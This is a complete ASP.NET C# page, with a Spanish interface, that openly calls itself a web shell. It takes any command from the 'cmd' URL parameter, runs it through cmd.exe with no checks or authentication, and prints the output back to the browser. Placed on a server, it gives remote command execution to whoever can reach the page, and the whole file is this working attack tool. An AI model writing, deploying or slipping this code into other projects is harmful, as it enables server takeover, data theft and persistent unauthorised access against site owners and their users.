<%@ Page Language="C#" %>
<!DOCTYPE html>
<html>
<head>
    <title>Web Shell</title>
</head>
<body>
    <form method="get">
        <input type="text" name="cmd" style="width:400px" placeholder="Comando a ejecutar..." />
        <input type="submit" value="Ejecutar" />
    </form>
    <pre>
<%
    string cmd = Request.QueryString["cmd"];
    if (!string.IsNullOrEmpty(cmd))
    {
        try
        {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + cmd;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.CreateNoWindow = true;
            p.Start();
            Response.Write(p.StandardOutput.ReadToEnd());
            Response.Write(p.StandardError.ReadToEnd());
            p.WaitForExit();
        }
        catch (System.Exception ex)
        {
            Response.Write("Error: " + ex.Message);
        }
    }
%>
    </pre>
</body>
</html>